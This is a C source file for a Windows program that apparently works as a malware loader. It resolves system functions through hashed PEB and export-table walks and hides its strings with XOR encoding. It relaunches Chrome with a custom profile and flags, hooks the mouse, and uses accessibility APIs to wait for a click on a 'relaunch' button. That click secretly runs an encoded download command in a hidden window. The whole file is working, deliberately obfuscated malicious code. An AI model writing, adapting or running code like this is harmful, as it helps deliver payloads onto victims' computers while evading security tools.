typedef unsigned char U8;
typedef unsigned short U16;
typedef unsigned long U32;
typedef unsigned long long UP;
typedef long long SP;
typedef long SL;
typedef int BOOL;
typedef U16 W;
typedef W *WS;
typedef const W *WC;
typedef const char *AC;
typedef void *P;
typedef void *H;
typedef SP LP;
typedef UP SZ;
typedef struct { SP a, b; } LE;
typedef struct { SL l, t, r, b; } RC;
typedef struct { SL x, y; } PT;
typedef struct { P hwnd; U32 m; UP w; SP l; U32 tm; PT pt; } MSG;
typedef struct {
    U32 cb;
    WS lpReserved;
    WS lpDesktop;
    WS lpTitle;
    U32 dwX, dwY, dwXSize, dwYSize;
    U32 dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    U16 wShowWindow, cbReserved2;
    U16 *lpReserved2;
    H hStdInput, hStdOutput, hStdError;
} SI;
typedef struct { H hProcess, hThread; U32 dwProcessId, dwThreadId; } PI;
typedef struct { PT pt; U32 md,fl,tm; UP ex; } MS;
typedef struct { U8 b[24]; } VR;
typedef struct { U32 d1; U16 d2,d3; U8 d4[8]; } GD;
typedef struct { U16 ln,mx; WS bf; } US;
typedef struct { LE lk[3]; P base; P ep; U32 sz; US full, base_name; } LM;
typedef struct { U8 r1[2],dbg,r2[1],r3[4]; P mut,img; P ldr; } PB;
typedef struct { U8 r[8]; LE list; } PL;

#define K32 0xA3E6F6C3u
#define FNV 0x811C9DC5u
#define WH_LL 14
#define WM_LD 0x0201
#define PM_RM 1
#define VT_I4 3
#define VT_DISP 9
#define CID 0
#define COINIT 2
#define OBJ_WIN 0
#define OBJ_CLIENT ((U32)0xFFFFFFFCu)
#define IID_ACC {0x618736e0,0x3c3d,0x11cf,{0x81,0x0c,0x00,0xaa,0x00,0x38,0x9b,0x71}}

static const U8 e_fetch[] = {0xb7,0xd4,0xa9,0xb5,0xfe,0xc3,0x9a,0x26,0x7a,0x47,0x0e,0x55,0x27,0x22,0x43,0x15,0x05,0xe2,0xeb,0xd1,0x92,0xe2,0xe8,0x96,0xa8,0xb6,0x43,0x43,0x5d,0x7a,0x67,0x00,0x10,0x0b,0x2d,0x5c,0xda,0xc4,0xd4,0xfa,0xef,0x90,0xf4,0xc3,0x9d,0x95,0x6f,0x71,0x57,0x13,0x62,0x68,0x16,0x27,0x36,0xc3,0xc3,0xdc,0xfa,0xe7,0x80,0x93,0x8b,0xad,0xdc,0x5b,0x44,0x54,0x7a,0x68,0x10,0x74,0x43,0x57,0x58,0xab,0xfb,0xd3,0xc1,0xac,0xe3,0xbe,0x90,0x90,0x22,0x3d,0x7b,0x59,0x64,0x09,0x72,0x72,0x03,0x5a,0xa5,0xb1,0xed,0xe0,0xff,0x88,0x9a,0xa5,0xa1,0xae,0x4f,0x58,0x72,0x72,0x65,0x12,0x0b,0x1d,0x21,0xd7,0xc9,0xc1,0xda,0xcd,0xb1,0xa6,0xa6,0xc3,0x9f,0x7f,0x71,0x00,0x0f,0x1e,0x21,0x23,0x10,0x01,0x0d,0xb6,0xb6,0x89,0xc7,0xa9,0xab,0xf5,0x8d,0x97,0x71,0x64,0x75,0x05,0x54,0x2c,0x7d,0x1e,0x1e,0x1d,0xf3,0xf4,0xd6,0xc7,0xdd,0xa7,0xf8,0x94,0x84,0x8b,0x78,0x60,0x09,0x58,0x20,0x3a,0x3e,0x1a,0x02,0xac,0xe7,0xa8,0x9f,0x97,0xb5,0xa6,0x94,0x99,0x83,0x26,0x70,0x5a,0x4a,0x1f,0x6a,0x71,0x42,0x52,0x0c,0xf8,0xf8,0xd5,0xc0,0xe1,0xec,0xfe,0xc9,0xd4,0x26,0x5d,0x51,0x68,0x79,0x0a,0x12,0x30,0x3d,0x3f,0xc9,0xc1,0xe3,0x95,0xe1,0x9a,0xa2,0xb1,0xa6,0xa6,0x50,0x6a,0x52,0x40,0x35,0x36,0x72,0x0c,0x0e,0xe1,0xb3};
#define E_FETCH_N 231
static const U8 e_relaunch[] = {0x4a,0x18,0x32,0x08,0x10,0x0a,0xe2,0xfa,0xce,0x94,0xaf,0xa1,0xac};
#define E_RELAUNCH_N 13
static const U8 e_chrome_cls[] = {0x3c,0x7f,0x21,0x24,0x0c,0x1c,0x1b,0xd4,0xcf,0xcf,0xd7,0xa7,0xa8,0xaf,0xbf,0x9c,0x6c,0x4f,0x2c};
#define E_CHROME_CLS_N 19
static const U8 e_blank[] = {0x55,0x34,0x00,0x00,0x09,0xfe,0xad,0xc6,0xdd,0xde,0xa2,0xb2};
#define E_BLANK_N 12
static const U8 e_pf_chrome[] = {0x91,0xb4,0xce,0xd9,0xd7,0xa1,0xa1,0x81,0x80,0xbd,0x61,0x79,0x47,0x43,0x18,0x16,0x10,0x0a,0x1d,0x18,0xe0,0xff,0xfb,0xf7,0xa9,0xbd,0xb3,0x84,0x93,0x58,0x50,0x6e,0x5b,0x55,0x2f,0x30,0x01,0x1a,0x12,0xe7,0xfb,0xff,0xd3,0xd5,0xb8,0xb7,0x88,0x97,0xd1,0x68,0x62,0x42};
#define E_PF_CHROME_N 52
static const U8 e_profile[] = {0x2e,0x0b,0x6f,0x0d,0x18,0x33,0x55,0x21,0xe9,0xea,0xd1};
#define E_PROFILE_N 11
static const U8 e_udir[] = {0x6d,0x4d,0x57,0xaa,0xe1,0xd1,0xca,0xce,0xe4,0xb3,0x85,0x85,0x9f,0x21,0x7d,0x4f,0x41,0x7c,0x6c};
#define E_UDIR_N 19
static const U8 e_flags[] = {0x19,0x3b,0x06,0x1e,0x6d,0x20,0x34,0x45,0x13,0xea,0xe2,0xee,0xde,0x95,0xb7,0xa7,0xb1,0xcd,0xd7,0x2a,0x67,0x4b,0x42,0x49,0x25,0x36,0x10,0x14,0x53,0xf9,0xe9,0xc1,0xc1,0xa0,0xaa,0xbe,0xc8,0xdb,0x2e,0x7e,0x78,0x5c,0x15,0x32,0x3b,0x0e,0x09,0x15,0xf0,0xb5,0xc3,0xcd,0xd3,0xbf,0xa3,0xde,0x93,0x93,0x6d,0x77,0x4d};
#define E_FLAGS_N 61
static const U8 e_preclean[] = {0x9e,0xfd,0xc6,0xdc,0xe5,0xfc,0x83,0xcd,0x88,0x6c,0x35,0x0d,0x5c,0x1d,0x65,0x26,0x44,0x50,0x5a,0xd8,0xdc,0xea,0xe4,0xe4,0x92,0xbf,0x9b,0x82,0x21,0x31,0x2c,0x15,0x56,0x33,0x3f};
#define E_PRECLEAN_N 35
static const U8 e_k32[] = {0xc1,0xaa,0xab,0xa9,0x86,0x93,0x6f,0x23,0x2f,0x05,0x5c,0x29,0x3e};
#define E_K32_N 13
static const U8 e_u32[] = {0xd2,0xa7,0xac,0x89,0x8b,0x34,0x26,0x0f,0x4a,0x50,0x25};
#define E_U32_N 11
static const U8 e_o32[] = {0xe3,0x8c,0x9c,0x98,0x39,0x2a,0x0b,0x56,0x53,0x21};
#define E_O32_N 10
static const U8 e_oaut[] = {0xf4,0x9b,0x6d,0x6b,0x7a,0x5c,0x42,0x70,0x62,0x70,0x0f,0x14,0xe9};
#define E_OAUT_N 13
static const U8 e_oacc[] = {0xa5,0xca,0xde,0xda,0xad,0xb9,0x84,0xda,0x65,0x63,0x70};
#define E_OACC_N 11

#ifdef _MSC_VER
UP __readgsqword(U32);
#pragma intrinsic(__readgsqword)
#endif

static struct {
    void (__stdcall *ExitProcess)(U32);
    BOOL (__stdcall *CreateProcessW)(WC,WS,P,P,BOOL,U32,P,WC,SI*,PI*);
    BOOL (__stdcall *CloseHandle)(H);
    void (__stdcall *Sleep)(U32);
    U32 (__stdcall *ExpandEnvironmentStringsW)(WC,WS,U32);
    P (__stdcall *LoadLibraryW)(WC);
    P (__stdcall *GetProcAddress)(P,AC);
    P (__stdcall *GetModuleHandleW)(WC);
    BOOL (__stdcall *EnumWindows)(BOOL(__stdcall*)(H,LP),LP);
    SL (__stdcall *GetClassNameW)(H,WS,SL);
    SL (__stdcall *GetWindowTextW)(H,WS,SL);
    BOOL (__stdcall *IsWindowVisible)(H);
    H (__stdcall *WindowFromPoint)(PT);
    U32 (__stdcall *GetWindowThreadProcessId)(H,U32*);
    P (__stdcall *SetWindowsHookExW)(SL,SP(__stdcall*)(SL,UP,SP),P,U32);
    BOOL (__stdcall *UnhookWindowsHookEx)(P);
    SP (__stdcall *CallNextHookEx)(P,SL,UP,SP);
    BOOL (__stdcall *PeekMessageW)(MSG*,H,U32,U32,U32);
    BOOL (__stdcall *TranslateMessage)(MSG*);
    SP (__stdcall *DispatchMessageW)(MSG*);
    void (__stdcall *PostQuitMessage)(SL);
    SL (__stdcall *CoInitializeEx)(P,U32);
    P (__stdcall *CoTaskMemAlloc)(SZ);
    void (__stdcall *CoTaskMemFree)(P);
    void (__stdcall *SysFreeString)(WS);
    SL (__stdcall *AccFromWindow)(H,U32,GD*,P*);
    SL (__stdcall *AccChildren)(P,SL,SL,VR*,SL*);
} A;

static RC g_r;
static P g_hook;
static volatile SL g_go;
static volatile SL g_clk;
static SL g_cx, g_cy;
static GD g_iid = IID_ACC;
static W g_btn[24];

static void memz(P p, SZ n){ U8 *b=(U8*)p; while(n--) *b++=0; }
static void vr_i4(VR *v, SL n){ memz(v,24); *(U16*)&v->b[0]=VT_I4; *(SL*)&v->b[8]=n; }
static U16 vr_vt(VR *v){ return *(U16*)&v->b[0]; }
static UP vr_p(VR *v){ return *(UP*)&v->b[8]; }

static U8 xr(U8 k, U32 i){ return (U8)(k+(U8)(i*13u)+(U8)(i>>2)); }
static void dw(WS o, U32 n, const U8 *e, U32 m){
    U8 k; U32 i,x; if(!o||n<2||!e||m<2){ if(o)o[0]=0; return; }
    k=e[0]; x=m-1; if(x>=n)x=n-1; for(i=0;i<x;i++) o[i]=(W)(e[i+1]^xr(k,i)); o[x]=0;
}
static void da(char *o, U32 n, const U8 *e, U32 m){
    U8 k; U32 i,x; if(!o||n<2||!e||m<2){ if(o)o[0]=0; return; }
    k=e[0]; x=m-1; if(x>=n)x=n-1; for(i=0;i<x;i++) o[i]=(char)(e[i+1]^xr(k,i)); o[x]=0;
}
static U32 ha(AC s){ U32 h=FNV; char c; while((c=*s++)){ if(c>='A'&&c<='Z')c+=32; h^=(U8)c; h=(U32)(h*0x01000193u);} return h; }
static U32 hw(WC s, U16 n){ U32 h=FNV; U16 i; for(i=0;i<n&&s[i];i++){ W c=s[i]; if(c>=L'A'&&c<=L'Z')c+=32; h^=(U8)(c&255); h=(U32)(h*0x01000193u);} return h; }
static int eq(WC a, WC b){ while(*a&&*b&&*a==*b){a++;b++;} return *a==*b; }
static int sub(WC h, WC n){ U32 i,j,hl,nl; for(hl=0;h[hl];hl++); for(nl=0;n[nl];nl++); if(nl>hl)return 0;
    for(i=0;i+nl<=hl;i++){ for(j=0;j<nl&&h[i+j]==n[j];j++); if(j==nl)return 1;} return 0; }
static void cat(WS d, WC s){ while(*d)d++; while(*s)*d++=*s++; *d=0; }

static P mod(U32 hash){
    PB *peb=(PB*)__readgsqword(0x60); PL *ldr; LE *h,*c; if(!peb||!peb->ldr)return 0;
    ldr=(PL*)peb->ldr; h=&ldr->list; c=(LE*)h->a;
    while(c&&c!=h){ LM *e=(LM*)c; if(e->base_name.bf&&e->base_name.ln>=2){
        if(hw(e->base_name.bf,e->base_name.ln/(U16)sizeof(W))==hash) return e->base; }
        c=(LE*)c->a; }
    return 0;
}
static P sym(P base, U32 hash){
    U8 *b=(U8*)base; SL pe; U32 *ed; U32 *names,*funcs; U16 *ords; U32 i,n;
    if(!base||*(U16*)b!=0x5A4D) return 0;
    pe=*(SL*)(b+0x3C); if(*(U32*)(b+pe)!=0x4550) return 0;
    ed=(U32*)(b+*(U32*)(b+pe+0x88)); if(!ed) return 0;
    names=(U32*)(b+ed[5]); funcs=(U32*)(b+ed[7]); ords=(U16*)(b+ed[8]); n=ed[6];
    for(i=0;i<n;i++) if(ha((AC)(b+names[i]))==hash) return b+funcs[ords[i]];
    return 0;
}
#define G(mod, fn, T) ((T)sym(mod, fn))
#define K(fn, T) G(mod(K32), fn, T)

static int bind(void){
    P k32=mod(K32), u32,o32,oaut,oacc; W w[96]; char a[96];
    if(!k32) return 0;
    A.GetProcAddress=G(k32,0xF8F45725u,P(__stdcall*)(P,AC));
    A.LoadLibraryW=G(k32,0x41B1EAB9u,P(__stdcall*)(WC));
    if(!A.GetProcAddress||!A.LoadLibraryW) return 0;
    A.ExitProcess=K(0x0E80FD3Au,void(__stdcall*)(U32));
    A.CreateProcessW=K(0x3C7BF3FFu,BOOL(__stdcall*)(WC,WS,P,P,BOOL,U32,P,WC,SI*,PI*));
    A.CloseHandle=K(0xFABA0065u,BOOL(__stdcall*)(H));
    A.Sleep=K(0x2FA62CA8u,void(__stdcall*)(U32));
    A.ExpandEnvironmentStringsW=K(0x0442FB01u,U32(__stdcall*)(WC,WS,U32));
    A.GetModuleHandleW=K(0xD263BDE6u,P(__stdcall*)(WC));
    dw(w,96,e_u32,E_U32_N); u32=A.LoadLibraryW(w); if(!u32)return 0;
    A.EnumWindows=G(u32,0x6D15BBBDu,BOOL(__stdcall*)(BOOL(__stdcall*)(H,LP),LP));
    A.GetClassNameW=G(u32,0xA47BC7BFu,SL(__stdcall*)(H,WS,SL));
    A.GetWindowTextW=G(u32,0x348B4515u,SL(__stdcall*)(H,WS,SL));
    A.IsWindowVisible=G(u32,0xAD81ADA9u,BOOL(__stdcall*)(H));
    A.WindowFromPoint=G(u32,0xB4996259u,H(__stdcall*)(PT));
    A.GetWindowThreadProcessId=G(u32,0xF50944D9u,U32(__stdcall*)(H,U32*));
    A.SetWindowsHookExW=G(u32,0x0A6E65C7u,P(__stdcall*)(SL,SP(__stdcall*)(SL,UP,SP),P,U32));
    A.UnhookWindowsHookEx=G(u32,0x9F7FA498u,BOOL(__stdcall*)(P));
    A.CallNextHookEx=G(u32,0x03285E6Eu,SP(__stdcall*)(P,SL,UP,SP));
    A.PeekMessageW=G(u32,0x1506B87Eu,BOOL(__stdcall*)(MSG*,H,U32,U32,U32));
    A.TranslateMessage=G(u32,0xE2F28554u,BOOL(__stdcall*)(MSG*));
    A.DispatchMessageW=G(u32,0x0D39BB5Fu,SP(__stdcall*)(MSG*));
    A.PostQuitMessage=G(u32,0x1B71F1B7u,void(__stdcall*)(SL));
    dw(w,96,e_o32,E_O32_N); o32=A.LoadLibraryW(w); if(!o32)return 0;
    A.CoInitializeEx=G(o32,0x4CACFE40u,SL(__stdcall*)(P,U32));
    A.CoTaskMemAlloc=G(o32,0x71ED1140u,P(__stdcall*)(SZ));
    A.CoTaskMemFree=G(o32,0x70B5CD01u,void(__stdcall*)(P));
    dw(w,96,e_oaut,E_OAUT_N); oaut=A.LoadLibraryW(w); if(!oaut)return 0;
    A.SysFreeString=G(oaut,0x14C944F5u,void(__stdcall*)(WS));
    dw(w,96,e_oacc,E_OACC_N); oacc=A.LoadLibraryW(w); if(!oacc)return 0;
    A.AccFromWindow=G(oacc,0xC9913078u,SL(__stdcall*)(H,U32,GD*,P*));
    A.AccChildren=G(oacc,0x95EEED38u,SL(__stdcall*)(P,SL,SL,VR*,SL*));
    da(a,96,e_k32,E_K32_N); return mod(ha(a))!=0;
}

#define VT(o,i,T) ((T)((P*)o)[i])
#define acc_name(o,v,pn) VT(o,10,SL(__stdcall*)(P,VR,WS*))(o,v,pn)
#define acc_loc(o,x,y,w,h,v) VT(o,22,SL(__stdcall*)(P,SL*,SL*,SL*,SL*,VR))(o,x,y,w,h,v)
#define acc_cnt(o,n) VT(o,8,SL(__stdcall*)(P,SL*))(o,n)
#define acc_rel(o) VT(o,2,UP(__stdcall*)(P))(o)
#define acc_hit(o,x,y,out) VT(o,24,SL(__stdcall*)(P,SL,SL,VR*))(o,x,y,out)
#define disp_qi(o,iid,pp) VT(o,0,SL(__stdcall*)(P,GD*,P*))(o,iid,pp)

static int in_r(SL x, SL y){
    return g_r.r>g_r.l && g_r.b>g_r.t && x>=g_r.l && x<g_r.r && y>=g_r.t && y<g_r.b;
}

static int name_is_btn(P node){
    VR id; WS name=0; int ok=0;
    vr_i4(&id,CID);
    if(acc_name(node,id,&name)>=0&&name){ ok=eq(name,g_btn); A.SysFreeString(name); }
    return ok;
}

static int acc_from_hw(H wh, P *o){
    if(A.AccFromWindow(wh,OBJ_WIN,&g_iid,o)>=0) return 1;
    return A.AccFromWindow(wh,OBJ_CLIENT,&g_iid,o)>=0;
}

static int pt_is_btn(SL x, SL y){
    P root=0, child=0; VR hit, id; PT pt={x,y}; H wh;
    wh=A.WindowFromPoint(pt);
    if(wh&&acc_from_hw(wh,&root)){
        if(acc_hit(root,x,y,&hit)>=0){
            if(vr_vt(&hit)==VT_I4){ int ok=name_is_btn(root); acc_rel(root); return ok; }
            if(vr_vt(&hit)==VT_DISP&&vr_p(&hit)&&disp_qi((P)vr_p(&hit),&g_iid,&child)>=0){
                int ok=name_is_btn(child);
                acc_rel(child); acc_rel(root); return ok;
            }
        }
        acc_rel(root);
    }
    root=0;
    if(!root_acc(&root)) return 0;
    if(acc_hit(root,x,y,&hit)<0){ acc_rel(root); return 0; }
    if(vr_vt(&hit)==VT_I4){ int ok=name_is_btn(root); acc_rel(root); return ok; }
    if(vr_vt(&hit)==VT_DISP&&vr_p(&hit)&&disp_qi((P)vr_p(&hit),&g_iid,&child)>=0){
        int ok=name_is_btn(child);
        acc_rel(child); acc_rel(root); return ok;
    }
    acc_rel(root); return 0;
}

static int acc_rect(P node, WC want, RC *r){
    VR id; WS name=0; SL n,i,got; VR *kids; P child;
    vr_i4(&id,CID);
    if(acc_name(node,id,&name)>=0&&name){ int hit=eq(name,want); A.SysFreeString(name); if(hit){
        SL x,y,w,h; if(acc_loc(node,&x,&y,&w,&h,id)>=0&&w>0){ r->l=x; r->t=y; r->r=x+w; r->b=y+h; return 1; } } }
    n=0; acc_cnt(node,&n); if(n<=0) return 0;
    kids=(VR*)A.CoTaskMemAlloc((SZ)n*sizeof(VR)); if(!kids) return 0;
    got=0; A.AccChildren(node,0,n,kids,&got);
    for(i=0;i<got;i++){ child=0;
        if(vr_vt(&kids[i])==VT_DISP&&vr_p(&kids[i])&&disp_qi((P)vr_p(&kids[i]),&g_iid,&child)>=0){
            if(acc_rect(child,want,r)){ acc_rel(child); A.CoTaskMemFree(kids); return 1; }
            acc_rel(child);
        } }
    A.CoTaskMemFree(kids); return 0;
}

static H g_hw;

static BOOL __stdcall pick(H h, LP p){
    W cls[32],title[96],wc[32],bl[16]; (void)p;
    if(!A.IsWindowVisible(h)) return 1;
    A.GetClassNameW(h,cls,32); A.GetWindowTextW(h,title,96);
    dw(wc,32,e_chrome_cls,E_CHROME_CLS_N); dw(bl,16,e_blank,E_BLANK_N);
    if(eq(cls,wc)&&sub(title,bl)){ g_hw=h; return 0; } return 1;
}
static int root_acc(P *o){
    g_hw=0; A.EnumWindows(pick,0); if(!g_hw) return 0;
    if(A.AccFromWindow(g_hw,OBJ_WIN,&g_iid,o)>=0) return 1;
    return A.AccFromWindow(g_hw,OBJ_CLIENT,&g_iid,o)>=0;
}

static int relaunch_hit(SL x, SL y){
    if(in_r(x,y)) return 1;
    return pt_is_btn(x,y);
}

static SP __stdcall hook(SL code, UP wp, SP lp){
    MS *m;
    if(code>=0&&wp==WM_LD&&!g_go){
        m=(MS*)lp;
        if(m){ g_cx=m->pt.x; g_cy=m->pt.y; g_clk=1; }
    }
    return A.CallNextHookEx(g_hook,code,wp,lp);
}

static int wait_click(SL tries){
    MSG msg; SL i; P r=0; g_go=0; g_hook=0; g_clk=0; memz(&g_r,sizeof(g_r));
    dw(g_btn,24,e_relaunch,E_RELAUNCH_N);
    for(i=0;i<tries;i++){ r=0; if(root_acc(&r)){ acc_rel(r); break; } if(r) acc_rel(r); A.Sleep(500); }
    if(i>=tries) return 0;
    g_hook=A.SetWindowsHookExW(WH_LL,hook,A.GetModuleHandleW(0),0); if(!g_hook) return 0;
    for(i=0;i<tries*20&&!g_go;i++){
        while(A.PeekMessageW(&msg,0,0,0,PM_RM)){
            if(msg.m==0x12) break;
            A.TranslateMessage(&msg); A.DispatchMessageW(&msg);
        }
        if((i&7)==0){ r=0; if(root_acc(&r)){ acc_rect(r,g_btn,&g_r); acc_rel(r); } else if(r) acc_rel(r); }
        if(g_clk){ g_clk=0; if(relaunch_hit(g_cx,g_cy)) g_go=1; }
        if(g_go) break;
        A.Sleep(50);
    }
    A.UnhookWindowsHookEx(g_hook); g_hook=0; return g_go>0;
}

static int run_fetch(void){
    W cmd[512]; SI si; PI pi; dw(cmd,512,e_fetch,E_FETCH_N);
    memz(&si,sizeof(si)); memz(&pi,sizeof(pi)); si.cb=sizeof(si);
    if(!A.CreateProcessW(0,cmd,0,0,0,0x08000000,0,0,&si,&pi)) return 0;
    A.CloseHandle(pi.hThread); A.CloseHandle(pi.hProcess); return 1;
}
static int kick_chrome(void){
    W exe[260],prof[260],cmd[640],ud[32],fl[64],pre[128]; SI si; PI pi;
    dw(pre,128,e_preclean,E_PRECLEAN_N);
    memz(&si,sizeof(si)); memz(&pi,sizeof(pi)); si.cb=sizeof(si);
    A.CreateProcessW(0,pre,0,0,0,0x08000000,0,0,&si,&pi);
    if(pi.hProcess){ A.CloseHandle(pi.hThread); A.CloseHandle(pi.hProcess); }
    A.Sleep(300);
    dw(exe,260,e_pf_chrome,E_PF_CHROME_N); A.ExpandEnvironmentStringsW(exe,exe,260);
    dw(prof,260,e_profile,E_PROFILE_N); A.ExpandEnvironmentStringsW(prof,prof,260);
    cmd[0]=0; cat(cmd,L"\""); cat(cmd,exe); cat(cmd,L"\""); dw(ud,32,e_udir,E_UDIR_N); cat(cmd,ud); cat(cmd,prof);
    dw(fl,64,e_flags,E_FLAGS_N); cat(cmd,fl);
    memz(&si,sizeof(si)); memz(&pi,sizeof(pi)); si.cb=sizeof(si);
    si.dwFlags=1; si.wShowWindow=5;
    if(!A.CreateProcessW(0,cmd,0,0,0,0,0,0,&si,&pi)) return 0;
    A.CloseHandle(pi.hThread); A.CloseHandle(pi.hProcess); return 1;
}

static U32 main_run(void){
    if(!bind()) return 1;
    if(A.CoInitializeEx(0,COINIT)<0) return 1;
    if(!kick_chrome()) return 2;
    if(!wait_click(600)) return 3;
    if(!run_fetch()) return 4;
    return 0;
}
void EntryPoint(void){ U32 c=main_run(); if(A.ExitProcess) A.ExitProcess(c); for(;;); }
